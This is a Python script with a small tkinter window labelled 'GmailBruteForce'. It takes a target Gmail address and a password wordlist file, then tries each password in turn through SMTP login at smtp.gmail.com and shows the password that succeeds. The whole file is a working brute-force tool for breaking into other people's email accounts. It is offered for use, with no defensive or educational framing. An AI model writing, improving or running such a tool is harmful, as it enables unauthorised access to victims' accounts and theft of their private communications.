import smtplib
import tkinter as tk
from tkinter import filedialog, messagebox
from os import system
from colorama import init, Fore, Style

# Initialize colorama
init()

def brute_force():
    smtpserver = smtplib.SMTP("smtp.gmail.com", 587, timeout=5)
    smtpserver.ehlo()
    smtpserver.starttls()

    user = email_entry.get()
    passwd_file = filedialog.askopenfilename(title="Select a password file")

    if not passwd_file:
        messagebox.showerror("Error", "Please select a password file")
        return

    try:
        with open(passwd_file, "r") as f:
            passwords = f.readlines()
    except FileNotFoundError:
        messagebox.showerror("Error", "Password file not found")
        return

    for password in passwords:
        try:
            smtpserver.login(user, password.strip())
            system("clear")
            print("\n")
            print(Fore.GREEN + "Password Detected : " + password.strip() + Style.RESET_ALL)
            messagebox.showinfo("Success", "Password found: {}".format(password))
            break
        except smtplib.SMTPAuthenticationError as e:
            error = str(e)
            if error[14] == '<':
                print(Fore.GREEN + "Password False!: " + password.strip() + Style.RESET_ALL)
                break
            else:
                print(Fore.GREEN + "Password False!: " + password.strip() + Style.RESET_ALL)

# Create GUI window
root = tk.Tk()
root.title("GmailBruteForce")
root.geometry("400x300")

# Create GUI widgets
email_label = tk.Label(root, text="Email Target:")
email_label.pack()

email_entry = tk.Entry(root)
email_entry.pack()

brute_force_button = tk.Button(root, text="Brute Force", command=brute_force)
brute_force_button.pack()

# Start GUI main loop
root.mainloop()
